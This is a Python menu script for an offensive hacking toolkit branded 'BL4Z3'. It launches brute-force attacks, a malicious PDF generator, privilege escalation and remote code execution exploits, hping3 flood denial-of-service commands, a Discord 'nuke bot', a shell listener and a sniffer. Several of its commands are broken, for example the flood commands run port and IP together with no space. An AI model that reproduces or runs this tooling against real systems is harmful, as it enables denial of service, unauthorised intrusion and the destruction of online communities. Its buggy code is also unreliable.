import os
import subprocess
import random
import argparse
import socket
import scapy.all as scapy
import requests
from colorama import Fore, Style, init
from port_scanner import scan_ports
import time
import hash_cracker
from vulnerability_scanner import run_vulnerability_scan
from listener import start_listener
from script import create_malicious_pdf
import ssh_bruteforce_with_proxy
import ftp_bruteforce_with_proxy
import script
import mac_changer
from mac_changer import change_mac
from torservice import manage_tor_service
from vulnerability_scanner import run_vulnerability_scan
# Configuration Instructions

# To ensure proper operation of the application, you need to configure the following settings in the Tor configuration file.

# Configuration File: /etc/tor/torrc

# 1. Enable ControlPort:
#    - Locate the ControlPort setting in the /etc/tor/torrc file.
#    - Uncomment the line by removing the # at the beginning.
#    - The line should look like this:
#      ControlPort 9051

# 2. Enable CookieAuthentication:
#    - Find the CookieAuthentication setting in the same file.
#    - Uncomment the line by removing the # at the beginning.
#    - The line should look like this:
#      CookieAuthentication 1

# These settings must be enabled for the application to function correctly. By default, these lines are commented out with #. Removing the # activates these settings, ensuring they are correctly applied.

# Please make sure to save your changes and restart the Tor service for the settings to take effect.


banner1 = """
 ███████████  █████       █████ █████  ███████████  ████████              █████████   █████               ███  █████              
░░███░░░░░███░░███       ░░███ ░░███  ░█░░░░░░███  ███░░░░███            ███░░░░░███ ░░███               ░░░  ░░███               
 ░███    ░███ ░███        ░███  ░███ █░     ███░  ░░░    ░███           ░███    ░░░  ███████   ████████  ████  ░███ █████  ██████ 
 ░██████████  ░███        ░███████████     ███       ██████░  ██████████░░█████████ ░░░███░   ░░███░░███░░███  ░███░░███  ███░░███
 ░███░░░░░███ ░███        ░░░░░░░███░█    ███       ░░░░░░███░░░░░░░░░░  ░░░░░░░░███  ░███     ░███ ░░░  ░███  ░██████░  ░███████ 
 ░███    ░███ ░███      █       ░███░   ████     █ ███   ░███            ███    ░███  ░███ ███ ░███      ░███  ░███░░███ ░███░░░  
 ███████████  ███████████       █████  ███████████░░████████            ░░█████████   ░░█████  █████     █████ ████ █████░░██████ 
░░░░░░░░░░░  ░░░░░░░░░░░       ░░░░░  ░░░░░░░░░░░  ░░░░░░░░              ░░░░░░░░░     ░░░░░  ░░░░░     ░░░░░ ░░░░ ░░░░░  ░░░░░░  
                                                                                                                                  
                                                                                                                                  
        v1.0                                                                                                                
"""

banner2 = """

oooooooooo.  ooooo              .o    oooooooooooo   .oooo.            .oooooo..o     .             o8o  oooo                  
`888'   `Y8b `888'            .d88   d'""""""d888' .dP""Y88b          d8P'    `Y8   .o8             `"'  `888                  
 888     888  888           .d'888         .888P         ]8P'         Y88bo.      .o888oo oooo d8b oooo   888  oooo   .ooooo.  
 888oooo888'  888         .d'  888        d888'        <88b.           `"Y8888o.    888   `888""8P `888   888 .8P'   d88' `88b 
 888    `88b  888         88ooo888oo    .888P           `88b. 8888888      `"Y88b   888    888      888   888888.    888ooo888 
 888    .88P  888       o      888     d888'    .P o.   .88P          oo     .d8P   888 .  888      888   888 `88b.  888    .o 
o888bood8P'  o888ooooood8     o888o  .8888888888P  `8bd88P'           8""88888P'    "888" d888b    o888o o888o o888o `Y8bod8P' 
                                                                                                                               
                                                                                                                               
        v1.0                                                                                                                   

"""

banner3 = """

:::::::::  :::      :::   ::::::::: ::::::::                :::::::: ::::::::::: :::::::::  ::::::::::: :::    ::: :::::::::: 
:+:    :+: :+:     :+:         :+: :+:    :+:              :+:    :+:    :+:     :+:    :+:     :+:     :+:   :+:  :+:        
+:+    +:+ +:+    +:+ +:+     +:+         +:+              +:+           +:+     +:+    +:+     +:+     +:+  +:+   +:+        
+#++:++#+  +#+   +#+  +:+    +#+       +#++: +#++:++#++:++ +#++:++#++    +#+     +#++:++#:      +#+     +#++:++    +#++:++#   
+#+    +#+ +#+  +#+#+#+#+#+ +#+           +#+                     +#+    +#+     +#+    +#+     +#+     +#+  +#+   +#+        
#+#    #+# #+#        #+#  #+#     #+#    #+#              #+#    #+#    #+#     #+#    #+#     #+#     #+#   #+#  #+#        
#########  ########## ### ######### ########                ########     ###     ###    ### ########### ###    ### ########## 
        v1.0   

"""

banner4 = """
██████╗ ██╗██╗  ██╗███████╗██████╗       ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
██╔══██╗██║██║  ██║╚══███╔╝╚════██╗      ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
██████╔╝██║███████║  ███╔╝  █████╔╝█████╗███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
██╔══██╗██║╚════██║ ███╔╝   ╚═══██╗╚════╝╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
██████╔╝███████╗██║███████╗██████╔╝      ███████║   ██║   ██║  ██║██║██║  ██╗███████╗
╚═════╝ ╚══════╝╚═╝╚══════╝╚═════╝       ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
        v1.0                                                                             
"""

banner5 = """
 ▄▄▄▄    ██▓    ▒███████▒  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
▓█████▄ ▓██▒    ▒ ▒ ▒ ▄▀░▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
▒██▒ ▄██▒██░    ░ ▒ ▄▀▒░ ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
▒██░█▀  ▒██░      ▄▀▒   ░  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
░▓█  ▀█▓░██████▒▒███████▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
░▒▓███▀▒░ ▒░▓  ░░▒▒ ▓░▒░▒▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
▒░▒   ░ ░ ░ ▒  ░░░▒ ▒ ░ ▒░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
 ░    ░   ░ ░   ░ ░ ░ ░ ░░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
 ░          ░  ░  ░ ░          ░              ░      ░  ░  ░      ░  ░
      ░         ░                                                     
"""

def start_port_scan():
    print (Fore.RED+"""

 ██▓███   ▒█████   ██▀███  ▄▄▄█████▓     ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  
▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒   ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░      ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░    ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░      ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░       ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
░░       ░ ░ ░ ▒    ░░   ░   ░         ░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░ 
             ░ ░     ░                       ░  ░ ░            ░  ░         ░          ░    ░  ░   ░     
                                                ░                                                        

""")
    ip = input("Enter the IP address to scan: ")
    start_port = int(input("Enter the start port: "))
    end_port = int(input("Enter the end port: "))
    
    print(f"Scanning ports from {start_port} to {end_port} on {ip}...")
    open_ports = port_scanner.scan_ports(ip, start_port, end_port)
    
    if open_ports:
        print(f"Open ports: {', '.join(map(str, open_ports))}")
    else:
        print("No open ports found.")


    port_scan_results = scan_ports(ip, start_port, end_port)
    print("Open Ports:", port_scan_results)

def start_vulnerability_scan():
    print(Fore.RED+"""

 ██▒   █▓ █    ██  ██▓     ███▄    █      ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒     ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░   ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░    ░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░ 
      ░     ░         ░  ░         ░          ░  ░ ░            ░  ░         ░          ░    ░  ░   ░     
     ░                                           ░                                                        

""")
    ip = input(Fore.GREEN+"Enter the IP address: ")
    scan_results = run_vulnerability_scan(ip)
    for result in scan_results:
        print(result)

def zeroday_exploit_manager():
    os.system('clear')
    print (Fore.RED+"""
                                                              
   @@@@@@@@ @@@@@@@@ @@@@@@@   @@@@@@     @@@@@@@   @@@@@@  @@@ @@@ 
        @@! @@!      @@!  @@@ @@!  @@@    @@!  @@@ @@!  @@@ @@! !@@ 
      @!!   @!!!:!   @!@!!@!  @!@  !@!    @!@  !@! @!@!@!@!  !@!@!  
    !!:     !!:      !!: :!!  !!:  !!!    !!:  !!! !!:  !!!   !!:   
   :.::.: : : :: ::   :   : :  : :. :     :: :  :   :   : :   .:    
           
                                                                 
    """)
    print(Fore.GREEN+"[1] PDF Zer0-Day Exploit")
    
    zero_day_exploit_choose = input ("Exploit: ")
    
    if zero_day_exploit_choose == '1':
        print ("PDF Zer0-Click Exploit Starting ... ")
        time.sleep(5)
        os.system('clear')
        create_malicious_pdf()
        

def start_local_exploit_manager():
    os.system('clear')
    print(Fore.RED+"""
     
 @@@       @@@@@@   @@@@@@@  @@@@@@  @@@     
 @@!      @@!  @@@ !@@      @@!  @@@ @@!     
 @!!      @!@  !@! !@!      @!@!@!@! @!!     
 !!:      !!:  !!! :!!      !!:  !!! !!:     
 : ::.: :  : :. :   :: :: :  :   : : : ::.: :
                                             
                                                                      
                                             """)
    print(Fore.GREEN + "[1] Linux Privilege Escalation Exploit      [CVE-2019-14287]")
    print(Fore.GREEN + "[2] Windows 10 Privilege Escalation Exploit [CVE-2020-0601]")
    choose_local_exploit = input ("Exploit Number: ")
    if choose_local_exploit == '1':
        os.system('cat sudo_exploit.sh')
    elif choose_local_exploit == '2':
        os.system('cat script.ps1')
    else:
        print("Invalid operation. Restarting ...")
        time.sleep(3)
        os.system('clear')
        start_local_exploit_manager()


def run_dos_exploit_manager():
    os.system('clear')
    print (Fore.RED+"""
                          
@@@@@@@   @@@@@@   @@@@@@ 
@@!  @@@ @@!  @@@ !@@     
@!@  !@! @!@  !@!  !@@!!  
!!:  !!! !!:  !!!     !:! 
:: :  :   : :. :  ::.: :  
                          

""")
    print (Fore.GREEN+"[1] DoS TCP Flood Exploit")
    print (Fore.GREEN+"[2] DoS UDP Flood Exploit")

    dos_exploit_choose = input ("Exploit: ")
    if dos_exploit_choose == '1':
        Hedef_Ip_dos_tcp = input ("Target IP Address: ")
        Hedef_port_dos_tcp = input ('Target Port: ')
        print (Fore.RED+"Starting DDoS Attack ... ")
        time.sleep(5)
        os.system ('hping3 --flood -S -p ' + Hedef_port_dos_tcp  + Hedef_Ip_dos_tcp)
    elif dos_exploit_choose == '2':
        Hedef_Ip_dos_udp = input ("Hedef IP: ")
        Hedef_port_dos_udp = input ("Hedef Port: ")
        print (Fore.RED+"Starting DDoS Attack ... ")
        time.sleep(5)
        os.system ('hping3 --flood -A -p ' + Hedef_port_dos_udp + Hedef_Ip_dos_udp)
    else:
        os.system('clear')
        run_dos_exploit_manager()


def start_remote_exploit_manager():
    os.system('clear')
    print(Fore.RED+"""                                                                                                                            

                                                        
@@@@@@@  @@@@@@@@ @@@@@@@@@@   @@@@@@  @@@@@@@ @@@@@@@@ 
@@!  @@@ @@!      @@! @@! @@! @@!  @@@   @!!   @@!      
@!@!!@!  @!!!:!   @!! !!@ @!@ @!@  !@!   @!!   @!!!:!   
!!: :!!  !!:      !!:     !!: !!:  !!!   !!:   !!:      
 :   : : : :: ::   :      :    : :. :     :    : :: ::  
                                                        

""")

    print (Fore.GREEN+"[1] Directory Trevaral Bash Exploit")
    print (Fore.GREEN+"[2] Directory Trevaral Python Exploit")
    print (Fore.GREEN+"[3] AnyDesk RCE Python Exploit")
    print (Fore.GREEN+"[4] Unreal Engine Remote Code Execution [CVE-2018-8267]")

    exploit_choose_remote = input (Fore.RED+"Seçimini Yap: ")

    if exploit_choose_remote == '1':
       os.system('chmod +x directory_trevarsal.sh')
       os.system('./directory_trevarsal.sh')
    elif exploit_choose_remote == '2':
       os.system('python directory_trevarsal.py')
    elif exploit_choose_remote == '3':
       os.system('python AnyDesk_RCE_exploit.py')
    elif exploit_choose_remote == '4':
        os.system('unreal_engine_remote_exploit.py')
    else:
       print(Fore.RED+"Invalid selection.")





def manage_exploits_system():
    print(Fore.RED+"""

▓█████ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓  ██████ 
▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒▒██    ▒ 
▒███   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░░ ▓██▄   
▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░   ▒   ██▒
░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ ▒██████▒▒
░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ░ ░  ░░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    ░ ░▒  ░ ░
   ░    ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      ░  ░  ░  
   ░  ░ ░    ░               ░  ░    ░ ░   ░                 ░  
                                                                

""")
    print(Fore.GREEN+"[1] Local")
    print(Fore.GREEN+"[2] Remote")
    print(Fore.GREEN+"[3] DoS")
    print(Fore.GREEN+"[4] Zer0-Day")
    exploit_type_choose = input ("Exploit Type: ")

    if exploit_type_choose == '1':
        start_local_exploit_manager()
    elif exploit_type_choose == '2':
        start_remote_exploit_manager()
    elif exploit_type_choose == '3':
        run_dos_exploit_manager()
    elif exploit_type_choose == '4':
        zeroday_exploit_manager()
    else:
        print("Invalid selection.")
        manage_exploits_system()
    
def run_discord_nuke_bot():
    os.system('python discord_nuke_bot.py')

def start_bruteforce_main():
    print (Fore.RED+"""
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                       
    """)
    print(Fore.GREEN+"[1] SSH Brute Force")
    print(Fore.GREEN+"[2] FTP Brute Force")
    print(Fore.GREEN+"[3] Hash Brute Force")

    burteforce_input = input("> ")
    if burteforce_input == '1':
        ssh_bruteforce_with_proxy.main()
    elif burteforce_input == '2':
        ftp_bruteforce_with_proxy.main()
    elif burteforce_input == '3':
        hash_cracker.main()
    else:
        print("Invalid Selection!")


def run_network_sniffer():
    print (Fore.GREEN+"""
    
███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝     ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗     ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗    ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                                                                         
    """)
    print (Fore.RED+"Starting Network Sniffer")
    os.system('sudo python network_sniffer.py')

banners = [banner1, banner2, banner3, banner4, banner5]
selected_banner = random.choice(banners)
print(Fore.GREEN + selected_banner)
print (Fore.RED + "This Tool Coded by BL4Z3")

def main_menu():
    print(Fore.BLUE+"[1] Vulnerability Scanner")
    print(Fore.BLUE+"[2] Port Scanner")
    print(Fore.BLUE+"[3] Exploits")
    print(Fore.BLUE+"[4] Anon Tor Service")
    print(Fore.BLUE+"[5] Discord Nuke Bot")
    print(Fore.BLUE+"[6] Shell Listener")
    print(Fore.BLUE+"[7] Brute Force")
    print(Fore.BLUE+"[8] Network Sniffer")
    print(Fore.BLUE+"[9] Mac Changer")
    print(Fore.BLUE+"[99] Exit")
    choice = input("root@bl4z3:~$  ")

    if choice == '1':
        start_vulnerability_scan()
    if choice == '2':
        start_port_scan()
    if choice == '3':
        manage_exploits_system()
    if choice == '4':
        manage_tor_service()
    if choice == '5':
        run_discord_nuke_bot()
    elif choice == '6':
        listener_port = int(input("Port: "))
        start_listener(listener_port)
    elif choice == '7':
        start_bruteforce_main()
    elif choice == '8':
        run_network_sniffer()
    elif choice == '9':
        interface = input("Enter the network interface (e.g., eth0): ")
        new_mac = input("Enter the new MAC address (e.g., 00:11:22:33:44:55): ")
        change_mac(interface, new_mac)
    elif choice == '99':
        print("Exit!")
    else:
        print("Inviald choice.")

if __name__ == "__main__":
    main_menu()




